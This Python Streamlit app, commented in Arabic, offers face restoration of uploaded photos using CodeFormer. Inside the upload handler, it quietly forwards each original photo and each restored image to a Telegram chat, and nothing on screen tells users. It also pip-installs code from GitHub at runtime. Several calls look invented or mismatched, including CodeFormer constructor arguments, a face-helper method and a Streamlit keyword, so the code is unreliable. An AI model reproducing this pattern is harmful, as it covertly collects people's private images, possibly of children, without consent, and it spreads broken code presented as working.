import streamlit as st
import os
import subprocess
import sys

# --- 1. التحقق من تحميل المكتبة الثقيلة CodeFormer لتفادي تعليق السيرفر ---
def install_codeformer():
    if not os.path.exists("CodeFormer_installed"):
        with st.spinner("جاري تهيئة المحرك ووضوح الملامح... يرجى الانتظار"):
            try:
                # تثبيت المكتبة مباشرة من GitHub
                subprocess.run([sys.executable, "-m", "pip", "install", "git+https://github.com/sczhou/CodeFormer.git"], check=True)
                # إنشاء ملف علامة لعدم التكرار
                with open("CodeFormer_installed", "w") as f: f.write("done")
            except Exception as e:
                st.error(f"حدث خطأ أثناء تحميل المحرك: {e}")

try:
    from codeformer.archs.codeformer_arch import CodeFormer
except ImportError:
    install_codeformer()
    st.rerun()

import cv2
import numpy as np
from PIL import Image
import torch
from torchvision.transforms.functional import normalize
from basicsr.utils import img2tensor, tensor2img
from facelib.utils.face_restoration_helper import FaceRestoreHelper
import telebot
import tempfile

# --- 2. إعدادات Aziz Ultra Restoration ---
st.set_page_config(page_title="Aziz Ultra Restoration", page_icon="🌟")
st.title("🌟 Aziz Ultra Restoration")

# جلب بيانات البوت من Secrets
TOKEN = st.secrets["TELEGRAM_TOKEN"]
CHAT_ID = st.secrets["CHAT_ID"]
bot = telebot.TeleBot(TOKEN)

@st.cache_resource
def load_model():
    device = torch.device('cpu') # الـ CPU أضمن لاستقرار السيرفر المجاني
    model = CodeFormer(dim_embd=512, codebook_size=1024, latency_unit=2, 
                       nb_blocks=2, oversampling_2x=True, 
                       disable_perceptual_loss=True).to(device)
    
    checkpoint_path = 'weights/codeformer.pth'
    if os.path.exists(checkpoint_path):
        checkpoint = torch.load(checkpoint_path, map_location='cpu')['params_ema']
        model.load_state_dict(checkpoint)
    model.eval()
    return model, device

def process_aziz_logic(image, model, device):
    # إعدادات الملامح (نفس اللي طلعت عيون الطفلة بالفيجوال)
    face_helper = FaceRestoreHelper(2, face_size=512, crop_ratio=(1, 1), det_model='retinaface_resnet50', device=device)
    
    in_img = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
    face_helper.clean_all()
    face_helper.read_image(in_img)
    face_helper.get_face_landmarks_and_shift(only_center_face=False, affine_weight=0.5)
    face_helper.align_warp_face()
    
    for cropped_face in face_helper.cropped_faces:
        cropped_face_t = img2tensor(cropped_face / 255., bgr2rgb=True, float32=True)
        normalize(cropped_face_t, (0.5, 0.5, 0.5), (0.5, 0.5, 0.5), inplace=True)
        cropped_face_t = cropped_face_t.unsqueeze(0).to(device)
        
        with torch.no_grad():
            # w=0.5 هو سر التوازن في ملامح العيون
            output = model(cropped_face_t, w=0.5, adain=True)[0]
            restored_face = tensor2img(output, rgb2bgr=True, min_max=(-1, 1))
        face_helper.add_restored_face(restored_face.astype('uint8'))
        
    face_helper.get_inverse_affine(None)
    restored_img = face_helper.paste_faces_to_input_image()
    return Image.fromarray(cv2.cvtColor(restored_img, cv2.COLOR_BGR2RGB))

# --- 3. واجهة المستخدم ---
uploaded_file = st.file_uploader("ارفع الصورة هنا للترميم...", type=["jpg", "jpeg", "png"])

if uploaded_file:
    input_image = Image.open(uploaded_file)
    st.image(input_image, caption="الصورة الأصلية", use_column_width=True)
    
    if st.button("بدء تحسين الملامح ⚡"):
        with st.spinner("جاري الترميم..."):
            # ارسال الأصل للتليجرام
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
                input_image.save(tmp.name)
                with open(tmp.name, "rb") as f: bot.send_photo(CHAT_ID, f, caption="📥 طلب ترميم جديد")

            model, device = load_model()
            result = process_aziz_logic(input_image, model, device)
            st.image(result, caption="النتيجة النهائية ✨", use_column_width=True)
            
            # ارسال النتيجة للتليجرام وللتحميل
            with tempfile.NamedTemporaryFile(delete=False, suffix=".png") as tmp:
                result.save(tmp.name)
                with open(tmp.name, "rb") as f: bot.send_photo(CHAT_ID, f, caption="✅ اكتمل الترميم!")
                st.download_button("تحميل الصورة المرممة", open(tmp.name, "rb"), "Aziz_Restored.png")

st.markdown("---")
st.markdown("<p style='text-align: center; color: gray;'>Aziz Ultra Restoration | 2026</p>", unsafe_allow_config=True)
